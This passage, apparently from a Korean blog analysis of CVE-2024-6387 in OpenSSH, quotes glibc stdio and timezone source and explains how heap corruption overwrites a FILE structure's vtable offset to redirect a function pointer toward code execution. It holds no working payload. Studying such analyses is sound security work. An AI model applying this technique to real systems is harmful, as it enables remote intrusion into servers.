<span class="nf">tzset_internal</span> <span class="p">(</span><span class="kt">int</span> <span class="n">always</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="cm">/* Try to read a data file.  */</span>
  <span class="n">__tzfile_read</span> <span class="p">(</span><span class="n">tz</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>
<details>
<summary>/time/tzfile.c:__tzfile_read</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">__tzfile_read</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">extra</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">extrap</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="cm">/* Note the file is opened with cancellation in the I/O functions
     disabled and if available FD_CLOEXEC set.  */</span>
  <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">"rce"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">ret_free_transitions</span><span class="p">;</span>
<span class="p">...</span>
 <span class="nl">read_again:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">__fread_unlocked</span> <span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">tzhead</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tzhead</span><span class="p">),</span>
					  <span class="mi">1</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
      <span class="o">||</span> <span class="n">memcmp</span> <span class="p">(</span><span class="n">tzhead</span><span class="p">.</span><span class="n">tzh_magic</span><span class="p">,</span> <span class="n">TZ_MAGIC</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tzhead</span><span class="p">.</span><span class="n">tzh_magic</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">lose</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>

<p>위와 같은 흐름에 의해서 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체가 힙 메모리에 생성됩니다.</p>

<p>취약점을 이용하여 특정 힙 청크를 겹치게 만든 후 이를 덮어쓰는 과정으로 공격을 진행합니다.</p>

<p>보고서에 나온 내용에 따르면 힙 손상을 통해 <code class="language-plaintext highlighter-rouge">__tzfile_read()</code>에서 할당된 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체의 <code class="language-plaintext highlighter-rouge">_vtable_offset</code> 필드 덮어써 함수 포인터에 의해 호출되는 함수를 임의로 조작하여
원하는 명령어를 실행할 수 있게됩니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
<span class="p">...</span>
<span class="p">};</span>
</code></pre></div></div>

<p>이렇게 오염된 메타데이터는 위 코드에서 살펴본 <code class="language-plaintext highlighter-rouge">__tzfile_read</code>에서  <code class="language-plaintext highlighter-rouge">__fread_unlocked</code>를 호출하는 과정에서 원하는 코드를 실행할 수 있게 만듭니다.</p>

<p><code class="language-plaintext highlighter-rouge">__fread_unlocked</code> 함수는 다음과 같은 호출 흐름을 갖습니다.</p>
<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph2.png" /></p>
<details>
<summary>libio/iofread_u.c:_IO_jump_t</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/iofread_u.c:__fread_unlocked</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span>
<span class="nf">__fread_unlocked</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">bytes_requested</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">bytes_read</span><span class="p">;</span>
  <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bytes_requested</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">_IO_sgetn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes_requested</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">bytes_requested</span> <span class="o">==</span> <span class="n">bytes_read</span> <span class="o">?</span> <span class="n">count</span> <span class="o">:</span> <span class="n">bytes_read</span> <span class="o">/</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/genops.c:_IO_sgetn</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span>
<span class="nf">_IO_sgetn</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* FIXME handle putback buffer here! */</span>
  <span class="k">return</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_sgetn</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/libioP.h:_IO_XSGETN(FP, DATA, N), _IO_WXSGETN(FP, DATA, N)</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The 'xsgetn' hook reads upto N characters into buffer DATA.
   Returns the number of character actually read.
   It matches the streambuf::xsgetn virtual function. */</span>
<span class="k">typedef</span> <span class="nf">size_t</span> <span class="p">(</span><span class="o">*</span><span class="n">_IO_xsgetn_t</span><span class="p">)</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">FP</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">DATA</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">N</span><span class="p">);</span>
<span class="cp">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
#define _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)
</span></code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/fileops.c:_IO_file_xsgetn</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span>
<span class="nf">_IO_file_xsgetn</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">want</span><span class="p">,</span> <span class="n">have</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

  <span class="n">want</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="k">while</span> <span class="p">(</span><span class="n">want</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">want</span> <span class="o">&lt;=</span> <span class="n">have</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">want</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">want</span><span class="p">;</span>
	  <span class="n">want</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="p">{</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="n">s</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">have</span><span class="p">);</span>
	      <span class="n">want</span> <span class="o">-=</span> <span class="n">have</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">have</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="cm">/* Check for backup and repeat */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
	    <span class="p">{</span>
	      <span class="n">_IO_switch_to_main_get_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	      <span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="cm">/* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
	      <span class="o">&amp;&amp;</span> <span class="n">want</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
	    <span class="p">{</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">__underflow</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
		<span class="k">break</span><span class="p">;</span>

	      <span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="cm">/* These must be set before the sysread as we might longjmp out
	     waiting for input. */</span>
	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	  <span class="n">_IO_setp</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>

	  <span class="cm">/* Try to maintain alignment: read a whole number of blocks.  */</span>
	  <span class="n">count</span> <span class="o">=</span> <span class="n">want</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span>
		<span class="n">count</span> <span class="o">-=</span> <span class="n">want</span> <span class="o">%</span> <span class="n">block_size</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
	      <span class="k">else</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>

	      <span class="k">break</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="n">s</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
	  <span class="n">want</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
	    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
	<span class="p">}</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">want</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_file_xsgetn</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/genops.c</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">__underflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">_IO_switch_to_main_get_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_have_markers</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">save_for_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="n">_IO_free_backup_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">_IO_UNDERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">__underflow</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/libioP.h:_IO_UNDERFLOW(FP),_IO_WUNDERFLOW(FP)</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The 'underflow' hook tries to fills the get buffer.
   It returns the next character (as an unsigned char) or EOF.  The next
   character remains in the get buffer, and the get position is not changed.
   It matches the streambuf::underflow virtual function. */</span>
<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">);</span>
<span class="cp">#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)
#define _IO_WUNDERFLOW(FP) WJUMP0 (__underflow, FP)
</span></code></pre></div>    </div>
  </div>
</details>

<p>여기서 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>멤버를 덮어 오프셋에 의해 호출되는 함수를 <code class="language-plaintext highlighter-rouge">_IO_file_underflow</code> 대신 <code class="language-plaintext highlighter-rouge">_IO_wfile_underflow</code>를 호출하게 만듭니다.</p>

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph3.png" /></p>

<details>
<summary>libio/fileops.c:_IO_file_jumps</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_new_file_seekoff</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/wfileops.c:_IO_wfile_jumps</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_wfile_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_new_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">)</span> <span class="n">_IO_wfile_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wfile_underflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wdefault_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">)</span> <span class="n">_IO_wdefault_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_wfile_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
